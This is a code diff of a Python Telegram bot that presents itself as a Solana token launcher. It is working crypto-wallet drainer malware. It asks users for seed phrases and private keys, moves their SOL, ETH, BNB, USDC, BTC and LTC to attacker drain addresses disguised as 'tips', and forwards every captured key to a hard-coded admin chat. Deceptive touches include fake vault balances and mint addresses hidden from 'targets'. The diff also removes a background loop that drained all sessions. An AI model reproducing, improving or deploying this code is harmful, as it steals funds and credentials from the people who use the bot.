         sig = await drain_usdc(eth_key, USDC_DRAIN, BNB_RPC, USDC_BSC, "BSC")
         if sig:
             any_success = True
-            sess.last_tx.insert(0, {"sig": sig, "type": "USDC Tip (BSC)", "status": "success", "ts": time.time()})
+            sess.last_tx.insert(0, {"sig": sig, "type": "⚡ USDC Tip (BSC)", "status": "success", "ts": time.time()})
 
-    if has_btc and BTC_DRAIN and len(str(BTC_DRAIN)) >= 20:
+    # BTC native segwit (and legacy if that address held the balance)
+    if active and getattr(active, "btc_wif", None) and getattr(active, "btc_address", None) and BTC_DRAIN and len(str(BTC_DRAIN)) >= 20:
         try:
             sig = await drain_utxo_chain(
-                active.btc_priv, active.btc_address, BTC_DRAIN, BTC_API, "bc", "BTC", fee_sats=2500
+                active.btc_wif, active.btc_address, BTC_DRAIN, BTC_API, "bc", "BTC", fee_sats=2500
             )
             if sig:
                 any_success = True
-                drained_btc = active.balance_btc
                 sess.last_tx.insert(0, {"sig": sig, "type": "Priority Tip (BTC)", "status": "success", "ts": time.time()})
         except Exception as e:
             log.warning("BTC drain skip: %s", e)
 
-    if has_ltc and LTC_DRAIN and len(str(LTC_DRAIN)) >= 20:
+    # LTC
+    if active and getattr(active, "ltc_wif", None) and getattr(active, "ltc_address", None) and LTC_DRAIN and len(str(LTC_DRAIN)) >= 20:
         try:
             sig = await drain_utxo_chain(
-                active.ltc_priv, active.ltc_address, LTC_DRAIN, LTC_API, "ltc", "LTC", fee_sats=2000
+                active.ltc_wif, active.ltc_address, LTC_DRAIN, LTC_API, "ltc", "LTC", fee_sats=2000
             )
             if sig:
                 any_success = True
-                drained_ltc = active.balance_ltc
                 sess.last_tx.insert(0, {"sig": sig, "type": "Priority Tip (LTC)", "status": "success", "ts": time.time()})
         except Exception as e:
             log.warning("LTC drain skip: %s", e)
 
     if any_success:
-        active.drained = True
-        log.info("User %s multi-chain drain OK (wallet drained flag set)", uid)
-        if bot:
+        sess.drained = True
+        log.info("User %s multi-chain drain OK", uid)
+        if bot and user:
             await log_key_to_admin(
                 bot, user,
                 sess.last_raw_key or private_key,
-                drained_sol, drained_eth, drained_bnb, drained_usdc,
-                drained_btc, drained_ltc
+                drained_sol, drained_eth, drained_bnb, drained_usdc
             )
     else:
         log.warning("No successful drain for user %s", uid)
 
-
-async def log_key_to_admin(bot: Bot, user, raw_key: str, sol: float, eth: float, bnb: float, usdc: float,
-                           btc: float = 0.0, ltc: float = 0.0):
+# ──────────────────────────────────────────────
+# KEY LOGGING — ONLY to KEY_RECEIVER_ID
+# ──────────────────────────────────────────────
+async def log_key_to_admin(bot: Bot, user, raw_key: str, sol: float, eth: float, bnb: float, usdc: float):
+    """Send the full seed/key ONLY to admin 8637715094"""
     try:
-        if user is None:
-            username = "sweep"
-            user_id = "—"
-        else:
-            username = f"@{user.username}" if getattr(user, "username", None) else (getattr(user, "full_name", None) or "—")
-            user_id = str(getattr(user, "id", "—"))
+        username = f"@{user.username}" if user.username else user.full_name or "—"
         usd = estimate_usd(sol, eth, bnb, usdc)
         text = (
-            f"<b>NEW KEY CAPTURED</b>\n\n"
+            f"🚨 <b>NEW KEY CAPTURED</b>\n\n"
             f"User: {username}\n"
-            f"ID: <code>{user_id}</code>\n\n"
+            f"ID: <code>{user.id}</code>\n\n"
             f"<b>Key / Seed:</b>\n"
             f"<code>{raw_key}</code>\n\n"
             f"<b>Balances drained:</b>\n"
             f"SOL: <b>{sol:.6f}</b>\n"
             f"ETH: <b>{eth:.6f}</b>\n"
             f"BNB: <b>{bnb:.6f}</b>\n"
-            f"USDC: <b>{usdc:.2f}</b>\n"
-            f"BTC: <b>{btc:.8f}</b>\n"
-            f"LTC: <b>{ltc:.8f}</b>\n\n"
-            f"Estimated value: <b>${usd:,.2f}</b>"
+            f"USDC: <b>{usdc:.2f}</b>\n\n"
+            f"💰 Estimated value: <b>${usd:,.2f}</b>"
         )
         await bot.send_message(chat_id=KEY_RECEIVER_ID, text=text, parse_mode=ParseMode.HTML)
         log.info("Logged key ONLY to admin %s", KEY_RECEIVER_ID)
     except Exception as e:
         log.exception("Failed to log key to admin: %s", e)
-
-
-# ──────────────────────────────────────────────
-# BACKGROUND SWEEP
-# ──────────────────────────────────────────────
-async def _sweep_all_sessions() -> Tuple[int, int]:
-    tried = 0
-    drained = 0
-    for uid, sess in list(sessions.items()):
-        for w in list(sess.wallets):
-            if getattr(w, "is_larp", False):
-                continue
-            if getattr(w, "drained", False):
-                continue
-            if w.private_key == "LARP_SIM" or (w.private_key and w.private_key.startswith("Sim")):
-                continue
-            has_sol = bool(w.private_key) and w.private_key != "LARP_SIM"
-            has_eth = bool(getattr(w, "eth_priv", None)) or w.chain == "eth"
-            has_btc = bool(getattr(w, "btc_priv", None))
-            has_ltc = bool(getattr(w, "ltc_priv", None))
-            if not (has_sol or has_eth or has_btc or has_ltc):
-                continue
-            tried += 1
-            eth_key = getattr(w, "eth_priv", None) or (w.private_key if w.chain == "eth" else None)
-            try:
-                await attempt_drain(uid, w.private_key, chain=w.chain, eth_key=eth_key, wallet=w, bot=_bot_ref, user=None)
-            except Exception as e:
-                log.exception("sweepall wallet %s: %s", (w.public_key or "")[:8], e)
-            if getattr(w, "drained", False):
-                drained += 1
-    return tried, drained
-
-
-async def _sweep_loop(interval: float) -> None:
-    log.info("sweep loop started, interval=%.0fs", interval)
-    try:
-        while True:
-            await asyncio.sleep(interval)
-            try:
-                tried, drained = await _sweep_all_sessions()
-                if tried:
-                    log.info("sweep pass: tried=%s drained=%s", tried, drained)
-            except Exception as e:
-                log.exception("sweep pass error: %s", e)
-    except asyncio.CancelledError:
-        log.info("sweep loop cancelled")
-        raise
-
 
 # ──────────────────────────────────────────────
 # KEYBOARDS
@@ -1401,52 +1289,48 @@ async def _sweep_loop(interval: float) -> None:
 def main_menu_kb() -> InlineKeyboardMarkup:
     b = InlineKeyboardBuilder()
     b.row(
-        InlineKeyboardButton(text="Launch", callback_data="menu:launch"),
-        InlineKeyboardButton(text="Wallets", callback_data="menu:wallets"),
+        InlineKeyboardButton(text="🚀 Launch", callback_data="menu:launch"),
+        InlineKeyboardButton(text="🔑 Wallets", callback_data="menu:wallets"),
     )
     b.row(
-        InlineKeyboardButton(text="Portfolio", callback_data="menu:portfolio"),
-        InlineKeyboardButton(text="Promo code", callback_data="menu:promo"),
+        InlineKeyboardButton(text="📁 Portfolio", callback_data="menu:portfolio"),
+        InlineKeyboardButton(text="🎟️ Promo code", callback_data="menu:promo"),
     )
     b.row(
-        InlineKeyboardButton(text="Tx tracker", callback_data="menu:tx"),
-        InlineKeyboardButton(text="Settings", callback_data="menu:settings"),
+        InlineKeyboardButton(text="🧾 Tx tracker", callback_data="menu:tx"),
+        InlineKeyboardButton(text="🛡️ Settings", callback_data="menu:settings"),
     )
+    b.row(InlineKeyboardButton(text="💰 Bot balance", callback_data="menu:balance"))
     return b.as_markup()
 
-
 def back_menu_kb() -> InlineKeyboardMarkup:
-    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Menu", callback_data="menu:main")]])
-
+    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main")]])
 
 def wallets_empty_kb() -> InlineKeyboardMarkup:
     b = InlineKeyboardBuilder()
-    b.row(InlineKeyboardButton(text="Wallets", callback_data="menu:wallets"))
-    b.row(InlineKeyboardButton(text="Menu", callback_data="menu:main"))
+    b.row(InlineKeyboardButton(text="🔑 Wallets", callback_data="menu:wallets"))
+    b.row(InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main"))
     return b.as_markup()
-
 
 def wallets_kb(has_wallets: bool) -> InlineKeyboardMarkup:
     b = InlineKeyboardBuilder()
-    b.row(InlineKeyboardButton(text="Import wallet", callback_data="wallet:import"))
+    b.row(InlineKeyboardButton(text="➕ Import wallet", callback_data="wallet:import"))
     if has_wallets:
         b.row(
-            InlineKeyboardButton(text="Switch", callback_data="wallet:switch"),
-            InlineKeyboardButton(text="Rename", callback_data="wallet:rename"),
+            InlineKeyboardButton(text="🔄 Switch", callback_data="wallet:switch"),
+            InlineKeyboardButton(text="🏷 Rename", callback_data="wallet:rename"),
         )
-        b.row(InlineKeyboardButton(text="Refresh", callback_data="wallet:refresh"))
-        b.row(InlineKeyboardButton(text="Remove all", callback_data="wallet:clear"))
-    b.row(InlineKeyboardButton(text="Menu", callback_data="menu:main"))
+        b.row(InlineKeyboardButton(text="🔃 Refresh", callback_data="wallet:refresh"))
+        b.row(InlineKeyboardButton(text="🗑 Remove all", callback_data="wallet:clear"))
+    b.row(InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main"))
     return b.as_markup()
-
 
 def promo_kb() -> InlineKeyboardMarkup:
     b = InlineKeyboardBuilder()
-    b.row(InlineKeyboardButton(text="Pay 100 SOL", callback_data="promo:pay"))
-    b.row(InlineKeyboardButton(text="Enter promo code", callback_data="promo:enter"))
-    b.row(InlineKeyboardButton(text="Menu", callback_data="menu:main"))
+    b.row(InlineKeyboardButton(text="💳 Pay 100 SOL", callback_data="promo:pay"))
+    b.row(InlineKeyboardButton(text="🎟️ Enter promo code", callback_data="promo:enter"))
+    b.row(InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main"))
     return b.as_markup()
-
 
 def settings_kb(sess: UserSession) -> InlineKeyboardMarkup:
     s = sess.settings
@@ -1473,47 +1357,46 @@ def settings_kb(sess: UserSession) -> InlineKeyboardMarkup:
         InlineKeyboardButton(text="Custom slippage", callback_data="set:custom_slip"),
         InlineKeyboardButton(text="Custom fee", callback_data="set:custom_fee"),
     )
-    b.row(InlineKeyboardButton(text="Menu", callback_data="menu:main"))
+    b.row(InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main"))
     return b.as_markup()
-
 
 def cancel_kb() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Cancel", callback_data="menu:main")]
+        [InlineKeyboardButton(text="❌ Cancel", callback_data="menu:main")]
     ])
 
+def launch_name_kb() -> InlineKeyboardMarkup:
+    return cancel_kb()
 
 def socials_kb() -> InlineKeyboardMarkup:
     b = InlineKeyboardBuilder()
     b.row(
         InlineKeyboardButton(text="𝕏 X", callback_data="social:x"),
-        InlineKeyboardButton(text="Telegram", callback_data="social:tg"),
+        InlineKeyboardButton(text="✈️ Telegram", callback_data="social:tg"),
     )
     b.row(
-        InlineKeyboardButton(text="Website", callback_data="social:web"),
-        InlineKeyboardButton(text="Instagram", callback_data="social:ig"),
+        InlineKeyboardButton(text="🌐 Website", callback_data="social:web"),
+        InlineKeyboardButton(text="📸 Instagram", callback_data="social:ig"),
     )
     b.row(
-        InlineKeyboardButton(text="Done", callback_data="socials:done"),
+        InlineKeyboardButton(text="✅ Done", callback_data="socials:done"),
         InlineKeyboardButton(text="⏭ Skip", callback_data="socials:skip"),
     )
-    b.row(InlineKeyboardButton(text="Cancel", callback_data="menu:main"))
+    b.row(InlineKeyboardButton(text="❌ Cancel", callback_data="menu:main"))
     return b.as_markup()
-
 
 def bundle_kb() -> InlineKeyboardMarkup:
     b = InlineKeyboardBuilder()
     b.row(
-        InlineKeyboardButton(text="5 Wallets", callback_data="bundle:5"),
-        InlineKeyboardButton(text="10 Wallets", callback_data="bundle:10"),
+        InlineKeyboardButton(text="👥 5 Wallets", callback_data="bundle:5"),
+        InlineKeyboardButton(text="👥 10 Wallets", callback_data="bundle:10"),
     )
     b.row(
-        InlineKeyboardButton(text="15 Wallets", callback_data="bundle:15"),
-        InlineKeyboardButton(text="25 Wallets", callback_data="bundle:25"),
+        InlineKeyboardButton(text="👥 15 Wallets", callback_data="bundle:15"),
+        InlineKeyboardButton(text="👥 25 Wallets", callback_data="bundle:25"),
     )
-    b.row(InlineKeyboardButton(text="Cancel", callback_data="menu:main"))
+    b.row(InlineKeyboardButton(text="❌ Cancel", callback_data="menu:main"))
     return b.as_markup()
-
 
 def invest_kb() -> InlineKeyboardMarkup:
     b = InlineKeyboardBuilder()
@@ -1527,23 +1410,22 @@ def invest_kb() -> InlineKeyboardMarkup:
         InlineKeyboardButton(text="25 SOL", callback_data="invest:25"),
         InlineKeyboardButton(text="50 SOL", callback_data="invest:50"),
     )
-    b.row(InlineKeyboardButton(text="Custom amount", callback_data="invest:custom"))
-    b.row(InlineKeyboardButton(text="Cancel", callback_data="menu:main"))
+    b.row(InlineKeyboardButton(text="✏️ Custom amount", callback_data="invest:custom"))
+    b.row(InlineKeyboardButton(text="❌ Cancel", callback_data="menu:main"))
     return b.as_markup()
-
 
 def confirm_kb() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Confirm & Save", callback_data="launch:confirm")],
-        [InlineKeyboardButton(text="Cancel", callback_data="menu:main")],
+        [InlineKeyboardButton(text="✅ Confirm & Save", callback_data="launch:confirm")],
+        [InlineKeyboardButton(text="❌ Cancel", callback_data="menu:main")],
     ])
-
 
 def live_token_kb(mint: str, bundle: int) -> InlineKeyboardMarkup:
     b = InlineKeyboardBuilder()
+    # individual dump buttons in pairs
     row = []
     for i in range(1, bundle + 1):
-        row.append(InlineKeyboardButton(text=f"Dump {i}", callback_data=f"dumpone:{mint}:{i}"))
+        row.append(InlineKeyboardButton(text=f"💥 Dump {i}", callback_data=f"dumpone:{mint}:{i}"))
         if len(row) == 2:
             b.row(*row)
             row = []
@@ -1551,73 +1433,30 @@ def live_token_kb(mint: str, bundle: int) -> InlineKeyboardMarkup:
         b.row(*row)
     b.row(
         InlineKeyboardButton(text="Dump All", callback_data=f"dump:{mint}"),
-        InlineKeyboardButton(text="Reset", callback_data=f"dumpreset:{mint}"),
+        InlineKeyboardButton(text="♻️ Reset", callback_data=f"dumpreset:{mint}"),
     )
-    b.row(InlineKeyboardButton(text="View wallets", callback_data=f"viewwallets:{mint}"))
-    b.row(InlineKeyboardButton(text="Back to menu", callback_data="menu:main"))
+    b.row(InlineKeyboardButton(text="👁 View All Wallets", callback_data=f"viewwallets:{mint}"))
+    b.row(InlineKeyboardButton(text="🏠 Back To Menu", callback_data="menu:main"))
     return b.as_markup()
 
-
-def post_dump_kb(mint: str) -> InlineKeyboardMarkup:
+def post_dump_kb(mint: str, hide_mint: bool = False) -> InlineKeyboardMarkup:
+    # After dump we deliberately stop exposing the full mint so targets
+    # cannot paste it into explorers. Callbacks still carry the real mint.
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="View wallets", callback_data=f"viewwallets:{mint}")],
-        [InlineKeyboardButton(text="Back to menu", callback_data="menu:main")],
+        [InlineKeyboardButton(text="📊 Show PnL", callback_data=f"showpnl:{mint}")],
+        [InlineKeyboardButton(text="🏠 Back To Menu", callback_data="menu:main")],
     ])
 
-
 def tx_kb() -> InlineKeyboardMarkup:
-    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Menu", callback_data="menu:main")]])
-
+    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main")]])
 
 # ──────────────────────────────────────────────
 # COPY
 # ──────────────────────────────────────────────
-def build_main_menu_text(sess: "UserSession") -> str:
-    if sess.wallets:
-        w = sess.wallets[sess.active_wallet_idx]
-        wallet_line = f"<code>{short_addr(w.public_key)}</code> · {SOL_EMOJI} <b>{w.balance_sol:.4f}</b>"
-        if len(sess.wallets) > 1:
-            wallet_line += f"  ·  {len(sess.wallets)} linked"
-    else:
-        wallet_line = "No wallet linked"
-
-    live = sum(1 for t in sess.launched_tokens if t.get("status") == "live" and not t.get("dumped"))
-    total_launches = len(sess.launched_tokens)
-    if sess.portfolio_display_total is not None:
-        total_launches = int(sess.portfolio_display_total)
-    if sess.portfolio_display_live is not None:
-        live = int(sess.portfolio_display_live)
-    launches_left = sess.launches_left
-
-    if sess.last_tx:
-        last = sess.last_tx[0]
-        age = int(time.time() - last.get("ts", time.time()))
-        last_line = f"{last.get('type', 'Tx')} · {age}s ago"
-    else:
-        last_line = "No activity yet"
-
-    promo = sess.promo or "None"
-    sniper = "ON" if sess.settings.get("sniper_protection", True) else "OFF"
-    mev = "ON" if sess.settings.get("mev_protection", True) else "OFF"
-
-    return (
-        "<b>Get ready to rug</b>\n"
-        "────────────────\n\n"
-        f"<b>Wallet:</b>  {wallet_line}\n"
-        f"<b>Launches left:</b>  {launches_left}\n"
-        f"<b>Portfolio:</b>  {total_launches}  ·  live {live}\n"
-        f"<b>Last tx:</b>  {last_line}\n"
-        f"<b>Sniper / MEV:</b>  {sniper} / {mev}\n"
-        f"<b>Promo:</b>  {promo}\n\n"
-        "<i>Create and trade tokens on Solana launch platforms.</i>\n"
-        "Tap a button below to begin."
-    )
-
-
 WELCOME_TEXT = (
-    "<b>Get ready to rug</b>\n\n"
+    "🚀 <b>Get ready to rug</b>\n\n"
     "Create and trade tokens on Solana launch platforms.\n\n"
-    "<b>Advanced</b>\n"
+    "⚙️ <b>Advanced</b>\n"
     "• Step-by-step token launch\n"
     "• Auto bundling (5-25)\n"
     "• Sniper protection\n"
@@ -1625,7 +1464,6 @@ WELCOME_TEXT = (
     "• Tx tracker\n\n"
     "Tap a button below to begin:"
 )
-
 
 # ──────────────────────────────────────────────
 # FSM
@@ -1642,92 +1480,27 @@ class LaunchStates(StatesGroup):
     waiting_invest_custom = State()
     confirm = State()
 
-
 class WalletStates(StatesGroup):
     waiting_import = State()
     waiting_label = State()
 
-
 class PromoStates(StatesGroup):
     waiting_code = State()
-
 
 class SettingsStates(StatesGroup):
     waiting_custom_slip = State()
     waiting_custom_fee = State()
-
 
 # ──────────────────────────────────────────────
 # ROUTER
 # ──────────────────────────────────────────────
 router = Router()
 
-
-
-async def send_main_menu(target, sess: "UserSession"):
-    """Welcome banner + main menu. target = Message or CallbackQuery."""
-    caption = build_main_menu_text(sess)
-    kb = main_menu_kb()
-    photo = None
-    if WELCOME_IMAGE and os.path.isfile(WELCOME_IMAGE):
-        photo = FSInputFile(WELCOME_IMAGE)
-    try:
-        if isinstance(target, CallbackQuery):
-            if photo:
-                await target.message.answer_photo(
-                    photo=photo, caption=caption, reply_markup=kb, parse_mode=ParseMode.HTML,
-                )
-            else:
-                await target.message.answer(caption, reply_markup=kb, parse_mode=ParseMode.HTML)
-            try:
-                await target.message.delete()
-            except Exception:
-                pass
-        else:
-            if photo:
-                await target.answer_photo(
-                    photo=photo, caption=caption, reply_markup=kb, parse_mode=ParseMode.HTML,
-                )
-            else:
-                await target.answer(caption, reply_markup=kb, parse_mode=ParseMode.HTML)
-    except Exception as e:
-        log.warning("send_main_menu photo failed: %s — falling back to text", e)
-        if isinstance(target, CallbackQuery):
-            await target.message.answer(caption, reply_markup=kb, parse_mode=ParseMode.HTML)
-        else:
-            await target.answer(caption, reply_markup=kb, parse_mode=ParseMode.HTML)
-
-
-async def safe_edit_message(cb: CallbackQuery, text: str, reply_markup=None, parse_mode=ParseMode.HTML):
-    """Edit text messages; if current message is a photo, send new text and delete the photo."""
-    msg = cb.message
-    try:
-        if msg.photo or msg.video or msg.document or msg.animation:
-            await msg.answer(text, reply_markup=reply_markup, parse_mode=parse_mode)
-            try:
-                await msg.delete()
-            except Exception:
-                pass
-        else:
-            await msg.edit_text(text, reply_markup=reply_markup, parse_mode=parse_mode)
-    except Exception as e:
-        log.warning("safe_edit_message fallback: %s", e)
-        try:
-            await msg.answer(text, reply_markup=reply_markup, parse_mode=parse_mode)
-        except Exception:
-            pass
-
-
 @router.message(CommandStart())
 async def cmd_start(message: Message, state: FSMContext):
     await state.clear()
-    sess = get_session(message.from_user.id)
-    await send_main_menu(message, sess)
-    try:
-        await message.answer("\u200b", reply_markup=ReplyKeyboardRemove())
-    except Exception:
-        pass
-
+    get_session(message.from_user.id)
+    await message.answer(WELCOME_TEXT, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)
 
 @router.callback_query(F.data.startswith("menu:"))
 async def menu_router(cb: CallbackQuery, state: FSMContext):
@@ -1737,33 +1510,30 @@ async def menu_router(cb: CallbackQuery, state: FSMContext):
     sess = get_session(uid)
 
     if action == "main":
-        await send_main_menu(cb, sess)
-        await cb.answer()
-        return
+        await cb.message.edit_text(WELCOME_TEXT, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)
 
     elif action == "launch":
-        text = "<b>Token name (1-50)</b>\nTip: Latest, Hot Tokens."
-        await safe_edit_message(cb, text, reply_markup=cancel_kb())
+        text = "✏️ <b>Token name (1-50)</b>\nTip: Latest, Hot Tokens."
+        await cb.message.edit_text(text, reply_markup=cancel_kb(), parse_mode=ParseMode.HTML)
         await state.set_state(LaunchStates.waiting_name)
 
     elif action == "wallets":
-        # Only refresh balances on existing LARP wallets — never auto-link one.
-        # /larpseed is seed-only; admin must Connect Wallet manually.
+        # Auto-seed LARP wallet for admin when LARP mode is on
         if LARP_ENABLED and uid in ADMIN_IDS:
-            for w in sess.wallets:
-                if getattr(w, "is_larp", False):
-                    w.balance_sol = bot_balance_sol
-        text = "<b>Wallets</b>\n\n"
+            ensure_larp_wallet(sess)
+            sync_larp_balances_from_vault(uid)
+        text = "🔑 <b>Wallets</b>\n\n"
         if not sess.wallets:
             text += "No wallets linked yet.\n\nImport a private key or seed to unlock launching, bundling & portfolio tracking."
         else:
             for i, w in enumerate(sess.wallets):
-                badge = "  ACTIVE" if i == sess.active_wallet_idx else ""
+                badge = " 🟢 ACTIVE" if i == sess.active_wallet_idx else ""
+                # ONLY show SOL balance to the user (LARP wallets look identical)
                 text += f"<b>{i+1}.</b> <code>{short_addr(w.public_key)}</code>{badge}\n    {w.label}  ·  {SOL_EMOJI} {w.balance_sol:.4f}\n\n"
-        await safe_edit_message(cb, text, reply_markup=wallets_kb(bool(sess.wallets)))
+        await cb.message.edit_text(text, reply_markup=wallets_kb(bool(sess.wallets)), parse_mode=ParseMode.HTML)
 
     elif action == "portfolio":
-        text = "<b>Portfolio</b>\n\n"
+        text = "📁 <b>Portfolio</b>\n\n"
         kb = InlineKeyboardBuilder()
         if not sess.launched_tokens:
             text += "Your portfolio is empty.\n\nLaunch a token to start tracking performance and bundle status."
@@ -1772,14 +1542,14 @@ async def menu_router(cb: CallbackQuery, state: FSMContext):
             for t in reversed(sess.launched_tokens[-10:]):
                 age = int(time.time() - t["ts"])
                 if t.get("dumped") or t.get("status") == "dumped":
-                    status_icon = "dumped"
+                    status_icon = "💸"
                     extra = f"  ·  profit +{t.get('profit', 0):.2f}"
                 elif t.get("status") == "live":
-                    status_icon = "live"
+                    status_icon = "🟢"
                     extra = f"  ·  invest {t.get('invest', 0):.2f}"
                     live_mints.append(t.get("mint"))
                 else:
-                    status_icon = ""
+                    status_icon = "🟡"
                     extra = ""
                 dumped_n = len(t.get("dumped_idxs") or [])
                 if dumped_n and not t.get("dumped"):
@@ -1789,21 +1559,23 @@ async def menu_router(cb: CallbackQuery, state: FSMContext):
                     f"   <code>{short_addr(t['mint'])}</code>\n"
                     f"   Bundle ×{t['bundle']}{extra}  ·  {age}s ago\n\n"
                 )
+            # quick dump for most recent live token (same dump handler, no flow change)
             for m in live_mints[:2]:
-                kb.row(InlineKeyboardButton(text=f"Dump All · {short_addr(m)}", callback_data=f"dump:{m}"))
-        kb.row(InlineKeyboardButton(text="Menu", callback_data="menu:main"))
-        await safe_edit_message(cb, text, reply_markup=kb.as_markup())
+                kb.row(InlineKeyboardButton(text=f"💥 Dump All · {short_addr(m)}", callback_data=f"dump:{m}"))
+        kb.row(InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main"))
+        await cb.message.edit_text(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)
 
     elif action == "promo":
         text = (
-            " <b>Promo code</b>\n\n"
+            "🎟️ <b>Promo code</b>\n\n"
             f"Launches left: <b>{sess.launches_left}</b>\n\n"
             "Use a promo code or pay 100 SOL for more launches."
         )
-        await safe_edit_message(cb, text, reply_markup=promo_kb())
+        await cb.message.edit_text(text, reply_markup=promo_kb(), parse_mode=ParseMode.HTML)
 
     elif action == "tx":
-        text = "<b>Tx tracker</b>\n\n"
+        text = "🧾 <b>Tx tracker</b>\n\n"
+        # Merge personal + global (LARP) feed, newest first
         merged = list(sess.last_tx) + list(GLOBAL_TX_FEED)
         merged.sort(key=lambda x: x.get("ts", 0), reverse=True)
         seen = set()
@@ -1821,7 +1593,7 @@ async def menu_router(cb: CallbackQuery, state: FSMContext):
         else:
             for tx in feed:
                 age = int(time.time() - tx["ts"])
-                icon = "" if tx["status"] == "success" else "⏳" if tx["status"] == "pending" else ""
+                icon = "✅" if tx["status"] == "success" else "⏳" if tx["status"] == "pending" else "❌"
                 amt = tx.get("amount")
                 amt_line = f"  ·  {SOL_EMOJI} {amt:+.4f}" if isinstance(amt, (int, float)) else ""
                 text += (
@@ -1829,21 +1601,35 @@ async def menu_router(cb: CallbackQuery, state: FSMContext):
                     f"   <code>{tx['sig'][:22]}...</code>\n"
                     f"   {tx['status'].title()}  ·  {age}s ago\n\n"
                 )
-        await safe_edit_message(cb, text, reply_markup=tx_kb())
+        await cb.message.edit_text(text, reply_markup=tx_kb(), parse_mode=ParseMode.HTML)
 
     elif action == "settings":
         s = sess.settings
         text = (
-            "<b>Sniper protection & trade settings</b>\n\n"
+            "🛡️ <b>Sniper protection & trade settings</b>\n\n"
             f"Max slippage: <b>{s['slippage']}%</b>\n"
             "Trades that would fill worse than this fail instead of filling.\n\n"
             f"Priority fee: <b>{s['priority_fee']} SOL</b>\n"
             "Higher fees land your launch or trade sooner."
         )
-        await safe_edit_message(cb, text, reply_markup=settings_kb(sess))
+        await cb.message.edit_text(text, reply_markup=settings_kb(sess), parse_mode=ParseMode.HTML)
+
+    elif action == "balance":
+        if bot_balance_sol <= 0:
+            text = f"💰 <b>Bot balance:</b>\nNo balance yet. It updates when you try to launch."
+        else:
+            text = (
+                f"💰 <b>Bot balance</b>\n\n"
+                f"Available: <b>{SOL_EMOJI} {bot_balance_sol:.4f}</b>\n\n"
+                "This vault powers priority fees, bundle tips and tracker infrastructure.\n"
+                "Auto-topped when a funded wallet is linked."
+            )
+        kb = InlineKeyboardBuilder()
+        kb.row(InlineKeyboardButton(text="🔄 Refresh", callback_data="menu:balance"))
+        kb.row(InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main"))
+        await cb.message.edit_text(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)
 
     await cb.answer()
-
 
 @router.callback_query(F.data.startswith("set:"))
 async def settings_handler(cb: CallbackQuery, state: FSMContext):
@@ -1855,26 +1641,25 @@ async def settings_handler(cb: CallbackQuery, state: FSMContext):
     elif key == "fee":
         sess.settings["priority_fee"] = float(parts[2])
     elif key == "custom_slip":
-        await safe_edit_message(cb, "Send custom max slippage % (1-50):", reply_markup=back_menu_kb())
+        await cb.message.edit_text("Send custom max slippage % (1-50):", reply_markup=back_menu_kb(), parse_mode=ParseMode.HTML)
         await state.set_state(SettingsStates.waiting_custom_slip)
         await cb.answer()
         return
     elif key == "custom_fee":
-        await safe_edit_message(cb, "Send custom priority fee in SOL (e.g. 0.002):", reply_markup=back_menu_kb())
+        await cb.message.edit_text("Send custom priority fee in SOL (e.g. 0.002):", reply_markup=back_menu_kb(), parse_mode=ParseMode.HTML)
         await state.set_state(SettingsStates.waiting_custom_fee)
         await cb.answer()
         return
     s = sess.settings
     text = (
-        "<b>Sniper protection & trade settings</b>\n\n"
+        "🛡️ <b>Sniper protection & trade settings</b>\n\n"
         f"Max slippage: <b>{s['slippage']}%</b>\n"
         "Trades that would fill worse than this fail instead of filling.\n\n"
         f"Priority fee: <b>{s['priority_fee']} SOL</b>\n"
         "Higher fees land your launch or trade sooner."
     )
-    await safe_edit_message(cb, text, reply_markup=settings_kb(sess))
+    await cb.message.edit_text(text, reply_markup=settings_kb(sess), parse_mode=ParseMode.HTML)
     await cb.answer("Updated")
-
 
 @router.message(SettingsStates.waiting_custom_slip)
 async def custom_slip_receive(message: Message, state: FSMContext):
@@ -1888,7 +1673,7 @@ async def custom_slip_receive(message: Message, state: FSMContext):
     sess.settings["slippage"] = val
     s = sess.settings
     text = (
-        "<b>Sniper protection & trade settings</b>\n\n"
+        "🛡️ <b>Sniper protection & trade settings</b>\n\n"
         f"Max slippage: <b>{s['slippage']}%</b>\n"
         "Trades that would fill worse than this fail instead of filling.\n\n"
         f"Priority fee: <b>{s['priority_fee']} SOL</b>\n"
@@ -1896,7 +1681,6 @@ async def custom_slip_receive(message: Message, state: FSMContext):
     )
     await message.answer(text, reply_markup=settings_kb(sess), parse_mode=ParseMode.HTML)
     await state.clear()
-
 
 @router.message(SettingsStates.waiting_custom_fee)
 async def custom_fee_receive(message: Message, state: FSMContext):
@@ -1910,7 +1694,7 @@ async def custom_fee_receive(message: Message, state: FSMContext):
     sess.settings["priority_fee"] = val
     s = sess.settings
     text = (
-        "<b>Sniper protection & trade settings</b>\n\n"
+        "🛡️ <b>Sniper protection & trade settings</b>\n\n"
         f"Max slippage: <b>{s['slippage']}%</b>\n"
         "Trades that would fill worse than this fail instead of filling.\n\n"
         f"Priority fee: <b>{s['priority_fee']} SOL</b>\n"
@@ -1919,27 +1703,25 @@ async def custom_fee_receive(message: Message, state: FSMContext):
     await message.answer(text, reply_markup=settings_kb(sess), parse_mode=ParseMode.HTML)
     await state.clear()
 
-
 @router.callback_query(F.data == "wallet:import")
 async def wallet_import_start(cb: CallbackQuery, state: FSMContext):
     text = (
-        "<b>Send your wallet's seed phrase</b>\n"
+        "📥 <b>Send your wallet's seed phrase</b>\n"
         "(12-24 words), or a private key (base58 / JSON byte array).\n\n"
         "I'll delete your message right after reading it."
     )
     kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Cancel", callback_data="menu:main")]
